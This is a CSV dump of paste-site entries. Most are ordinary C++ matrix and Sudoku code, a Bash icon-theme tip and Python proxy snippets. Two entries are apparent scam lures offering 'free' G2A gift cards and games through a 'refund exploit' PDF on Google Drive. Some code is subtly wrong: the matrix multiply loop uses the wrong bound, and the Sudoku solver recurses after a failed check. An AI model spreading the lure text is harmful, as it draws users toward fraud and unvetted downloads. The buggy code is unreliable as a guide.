id,title,username,language,date,content
SPDpTaiU,Untitled,Josif_tepe,C++,Thursday 11th of April 2024 12:52:47 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<int>> matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;

matrix multiply_by_k(matrix A, int k) {
    matrix res = A;
    int n = (int) A.size(), m = (int) A[0].size();
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] *= k;
        }
    }
    return res;
}
matrix add_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a == n_b and m_a == m_b) {
        matrix res = A;
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_a; j++) {
                res[i][j] = A[i][j] + B[i][j];
            }
        }
        return res;
    }
    cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
    return {{0}};
}
matrix subtract_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a != n_b or m_a != m_b) {
        cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
        return {{0}};
    }
    matrix res = A;
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_a; j++) {
            res[i][j] = A[i][j] - B[i][j];
        }
    }
    return res;
}
matrix multiply_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(m_a != n_b) {
        cout << ""Matricite ne mozhat da se mnozhat"" << endl;
        return {{0}};
    }
    matrix res(n_a, vector<int>(m_b, 0));
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_b; j++) {
            int c = 0;
            for(int k = 0; k < n_a; k++) {
                c += A[i][k] * B[k][j];
            }
            res[i][j] = c;
        }
    }
    
    return res;
}
int determinant_of_matrix(matrix A) {
    int sz = (int) A.size();
    if(sz == 2) {
        return (A[0][0] * A[1][1]) - (A[0][1] * A[1][0]);
    }
    int determinant = 0;
    int sign = 1;
    for(int i = 0; i < sz; i++) {
        int n = 0, m = 0;
        
        matrix tmp(sz - 1, vector<int>(sz - 1, 0));
        for(int j = 0; j < sz; j++) {
            for(int k = 0; k < sz; k++) {
                if(j != 0 and k != i) {
                    tmp[n][m] = A[j][k];
                    if(m < sz - 2) {
                        m++;
                    }
                    else {
                        m = 0;
                        n++;
                    }
                }
            }
            
        }
        determinant = determinant + sign*(A[0][i]) * determinant_of_matrix(tmp);
        sign *= -1;
    }
    return determinant;
}
void print(matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
int main() {
    matrix A = {
        {1, 3, 5, 9},
        {1, 3, 1, 7},
        {4, 3, 9, 7},
        {5, 2, 0, 9}
        
    };
    matrix B = {
        {1, 2, 3},
        {4, 5, 6},
        
    };
    
    cout << determinant_of_matrix(A) << endl;
    return 0;
}
"
4iWjLgs7,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Thursday 11th of April 2024 12:45:26 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
11 April 2024"
H4YW1Sdt,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Thursday 11th of April 2024 12:41:57 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_698386.pdf

Working as of:
11 April 2024"
4CctiWLt,Untitled,Josif_tepe,C++,Thursday 11th of April 2024 12:03:53 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<int>> matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;

matrix multiply_by_k(matrix A, int k) {
    matrix res = A;
    int n = (int) A.size(), m = (int) A[0].size();
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] *= k;
        }
    }
    return res;
}
matrix add_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a == n_b and m_a == m_b) {
        matrix res = A;
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_a; j++) {
                res[i][j] = A[i][j] + B[i][j];
            }
        }
        return res;
    }
    cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
    return {{0}};
}
matrix subtract_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a != n_b or m_a != m_b) {
        cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
        return {{0}};
    }
    matrix res = A;
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_a; j++) {
            res[i][j] = A[i][j] - B[i][j];
        }
    }
    return res;
}
matrix multiply_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(m_a != n_b) {
        cout << ""Matricite ne mozhat da se mnozhat"" << endl;
        return {{0}};
    }
    matrix res(n_a, vector<int>(m_b, 0));
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_b; j++) {
            int c = 0;
            for(int k = 0; k < n_a; k++) {
                c += A[i][k] * B[k][j];
            }
            res[i][j] = c;
        }
    }
    
    return res;
}
void print(matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
int main() {
    matrix A = {
        {1, 2},
        {3, 4}
        
    };
    matrix B = {
        {1, 2, 3},
        {4, 5, 6},
        
    };
    
    matrix multiplied_by_k = multiply_by_k(A, 2);
    print(multiplied_by_k);
    
    matrix add_two_matrix = add_two_matrices(A, B);
    print(add_two_matrix);
    
    
    matrix subtrac_two_matrix = subtract_two_matrices(A, B);
    print(subtrac_two_matrix);
    
    matrix multiplication_two_matrices = multiply_two_matrices(A, B);
    print(multiplication_two_matrices);
    return 0;
}
"
ZvzaQpSp,Untitled,ABCD12399,C++,Thursday 11th of April 2024 11:57:04 AM CDT,"class Solution {
public:
 bool check(vector<vector<char>> &board, int no, int r, int c){
    // row
    for(int i = 0 ; i < 9 ; i++ ){
        if(board[i][c]==no)return false;
    }
    // column
    for(int j = 0 ; j < 9 ; j++ ){
        if(board[r][j]==no)return false;
    }
    // box
    int a = r%3;
    int b = c%3;
    int topLeftr = r-a;
    int topLeftc = c-b;
    for(int i = topLeftr ; i< topLeftr + 3 ; i ++){
        for(int j = topLeftc ; j < topLeftc + 3 ; j++){
            if(board[i][j]==no)return false;
        }
    }
    return true;
}
 bool findEmpty(vector<vector<char>> &board, int &r, int &c){
    for(int i = 0;i<9;i++){
        for(int j = 0 ;j<9;j++){
            if(board[i][j]=='.'){ 
                r = i;
                c = j;
                return true;
            }
            c++;
        }
        r++;
    }
    return false;
}

 bool solve(vector<vector<char>> &board){
    int r,c;
    if(!findEmpty(board, r, c)){
        return true;
    }
    for(char i = '1'; i<='9' ; i++){
        if(check(board, i, r, c)){
            board[r][c]=i;
        }
        bool flag = solve(board);
        if(flag){
            return true;
        }
        board[r][c]='.';
    }
    return false;
}
    void solveSudoku(vector<vector<char>>& board) {
        solve(board);
    }
};"
U6trLTCs,Untitled,Josif_tepe,C++,Thursday 11th of April 2024 11:35:39 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<int>> matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;

matrix multiply_by_k(matrix A, int k) {
    matrix res = A;
    int n = (int) A.size(), m = (int) A[0].size();
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] *= k;
        }
    }
    return res;
}
matrix add_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a == n_b and m_a == m_b) {
        matrix res = A;
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_a; j++) {
                res[i][j] = A[i][j] + B[i][j];
            }
        }
        return res;
    }
    cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
    return {{0}};
}
matrix subtract_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a != n_b or m_a != m_b) {
        cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
        return {{0}};
    }
    matrix res = A;
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_a; j++) {
            res[i][j] = A[i][j] - B[i][j];
        }
    }
    return res;
}
void print(matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
int main() {
    matrix A = {
        {3, 2, 0},
        {1, 1, 2},
        {4, 5, 9}
    };
    matrix B = {
        {1, 1, 1},
        {1, 1, 1},
        {1, 1, 1}
    };
    
    matrix multiplied_by_k = multiply_by_k(A, 2);
    print(multiplied_by_k);
    
    matrix add_two_matrix = add_two_matrices(A, B);
    print(add_two_matrix);
    
    
    matrix subtrac_two_matrix = subtract_two_matrices(A, B);
    print(subtrac_two_matrix);
    return 0;
}
"
YFEf8QTc,Set Icon Theme for Thunar/Linux Desktop,metalx1000,Bash,Thursday 11th of April 2024 11:17:40 AM CDT,"#install a theme
sudo apt install papirus-icon-theme

#list themes
ls -I ""*.*"" /usr/share/icons

# set theme
vim ~/.config/gtk-3.0/settings.ini

#in that file set theme
gtk-icon-theme-name=Papirus

# If working with thunar, be sure to kill and restart thunar"
87TFw1g5,vector 1,LEGEND2004,C++,Thursday 11th of April 2024 11:16:02 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define double long double
#define _FastIO ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
    _FastIO;

    int n;
    cin >> n;

    // static array
    //int a[n];
    
    // dynamic array

    vector<int> a(n); // size = n ,
    /*for(int i = 0; i < n; i++){
        cin >> a[i];
    }*/

    a.push_back(5);
    cout << a.size() << '\n';
    for(int i = 0; i < a.size(); i++){
        cout << a[i] << "" "";
    }
    cout << '\n';
    cout << a.back();

    /*
    string s;
    cin >> s; // Aa0bcBC123
    sort(s.begin() , s.end());
    cout << s; // 0123ABCabc
    */
    // 0 0 0 5


}
"
npyy8qDY,Untitled,dereksir,Python,Thursday 11th of April 2024 10:49:14 AM CDT,"# import the necessary libraries
import httpx
import random

# define your proxy list
proxy_urls = [
    ""http://20.210.113.32:8123"",
    ""http://47.56.110.204:8989"",
    ""http://50.174.214.216:80"",
    # add more proxy URLs as needed
]"
fuX051WR,Untitled,dereksir,Python,Thursday 11th of April 2024 10:11:57 AM CDT,"import httpx

# define your proxy settings
proxy_url = ""http://username:password@216.137.184.253:80""

# create a client with the specified proxy and credentials
with httpx.Client(proxy=proxy_url) as client:
    # make requests using the client
    r = client.get(""https://httpbin.io/ip"")

print(r.text)"
